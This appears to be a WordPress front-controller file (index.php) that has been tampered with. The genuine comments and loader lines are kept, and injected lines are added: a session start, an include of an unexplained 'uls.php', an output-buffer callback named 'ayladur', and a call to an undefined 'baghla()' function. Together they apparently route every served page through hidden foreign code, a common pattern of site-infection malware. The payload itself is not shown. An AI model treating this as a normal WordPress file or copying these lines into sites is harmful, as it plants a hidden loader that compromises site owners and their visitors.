<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
session_start();
require_once "uls.php";
ob_start("ayladur");
baghla();
define('WP_USE_THEMES', true);
require('./wp-blog-header.php');
ob_end_flush();
?>